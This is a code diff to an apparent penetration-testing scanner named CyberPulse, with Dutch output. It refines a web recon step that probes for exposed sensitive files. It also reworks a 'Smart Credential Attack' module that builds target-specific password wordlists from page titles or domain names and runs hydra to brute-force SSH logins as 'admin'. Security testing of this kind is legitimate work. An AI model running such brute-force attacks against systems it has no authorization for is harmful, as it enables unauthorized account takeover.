@@ -234,6 +234,15 @@ def _run_visual_recon(target: str) -> str:
     disallow_entries: list[str] = []
     found_count = 0
 
+    # Quick connectivity probe — if the webserver isn't reachable, skip all paths
+    # and show one clean line instead of a raw exception per path.
+    try:
+        _req.get(base + "/", timeout=5, verify=False,
+                 headers={"User-Agent": "CyberPulse/1.0"})
+    except Exception:
+        lines.append("[M11] Poort 80 niet open — webserver niet bereikbaar op dit doel")
+        return "\n".join(lines)
+
     for path in paths:
         url = f"{base}{path}"
         try:
@@ -260,8 +269,9 @@ def _run_visual_recon(target: str) -> str:
                         entry = stripped.split(":", 1)[1].strip()
                         if entry:
                             disallow_entries.append(entry)
-        except Exception as exc:
-            lines.append(f"  {path} → fout ({exc})")
+        except Exception:
+            # Never leak raw Python exceptions — keep it clean and Dutch.
+            lines.append(f"  {path} → niet bereikbaar")
 
     lines.append(f"[M11] {found_count} gevoelige bestand(en) blootgesteld.")
     if disallow_entries:
@@ -277,38 +287,65 @@ def _run_smart_credential(scan_id: str, target: str, all_outputs: dict, runner) 
     lines: list[str] = ["[M12] Smart Credential Attack — doelspecifieke aanval"]
     try:
         import re as _re
+        import ipaddress as _ip
 
-        # Extract a company/site name from earlier tool outputs (whatweb/httpx Title:)
-        name = ""
+        # Combine all earlier tool output for title extraction
+        combined = ""
         for phase_data in all_outputs.values():
             for output in phase_data.values():
-                if not output:
-                    continue
-                for raw in output.splitlines():
-                    if "Title:" in raw:
-                        after = raw.split("Title:", 1)[1].strip()
-                        token = after.split()[0] if after.split() else ""
-                        if token:
-                            name = token
-                            break
-                if name:
-                    break
-            if name:
-                break
+                if output:
+                    combined += output + "\n"
 
+        name = ""
+        source = "standaard"
+
+        # 1) whatweb Title[...]  → 2) any bracketed page title in httpx output
+        m = _re.search(r"Title\[([^\]]+)\]", combined)
+        if not m:
+            m = _re.search(r"\[([A-Za-z][^\]]{2,60})\]", combined)
+        if m:
+            token = next(
+                (w for w in _re.split(r"[\s:|/]+", m.group(1)) if w and w[0].isalpha()),
+                "",
+            )
+            cleaned = _re.sub(r"[^a-zA-Z0-9]", "", token).lower()
+            if len(cleaned) >= 3:
+                name = cleaned
+                source = "paginatitel"
+
+        # 3) domain name (only when the target is NOT a pure IP)
         if not name:
-            name = target.split(".")[0].split("/")[-1]
+            host = target.split("://")[-1].split("/")[0].split(":")[0]
+            is_ip = True
+            try:
+                _ip.ip_address(host)
+            except ValueError:
+                is_ip = False
+            if not is_ip and "." in host:
+                cleaned = _re.sub(r"[^a-zA-Z0-9]", "", host.split(".")[0]).lower()
+                if len(cleaned) >= 2:
+                    name = cleaned
+                    source = "domeinnaam"
 
-        # Clean: lowercase, strip non-alphanumeric
-        name = _re.sub(r"[^a-zA-Z0-9]", "", name).lower() or "admin"
+        # Username to brute-force: a name rarely is the login, so default to admin.
+        username = "admin"
 
-        words = [
-            name, name + "123", name + "2024", name + "2025", name + "@123",
-            name.capitalize() + "!", "admin", "administrator", "test",
-            "welkom01", "Welkom2024", "password", "toor",
+        # Name-derived passwords (only if we actually found a meaningful name)
+        name_words = (
+            [name, name + "123", name + "2024", name + "2025", name + "@123",
+             name.capitalize() + "!"]
+            if name else []
+        )
+        base_words = [
+            "admin", "administrator", "welkom01", "Welkom01!",
+            "welkom2024", "Welkom2024!", "test", "test123",
+            "password", "Password1!", "changeme", "toor",
         ]
+        # Deduplicate, preserve order
+        words = list(dict.fromkeys(name_words + base_words))
 
-        lines.append(f"[M12] Gebruikte naam: '{name}' — wordlist met {len(words)} wachtwoorden.")
+        lines.append(f"[M12] Gebruikte naam: '{name or '(geen)'}' uit {source}")
+        lines.append(f"[M12] Wordlist met {len(words)} wachtwoorden, gebruiker '{username}'.")
 
         wl = "\\n".join(words)
         wordlist_path = f"/opt/cyberpulse/custom_{scan_id}.txt"
@@ -320,7 +357,7 @@ def _run_smart_credential(scan_id: str, target: str, all_outputs: dict, runner) 
 
         result = runner.run_safe(
             "hydra",
-            f"-l admin -P {wordlist_path} -t 4 -f -V {target} ssh",
+            f"-l {username} -P {wordlist_path} -t 4 -f -V {target} ssh",
             120,
         )
         hydra_out = result.stdout or (result.stderr or "")
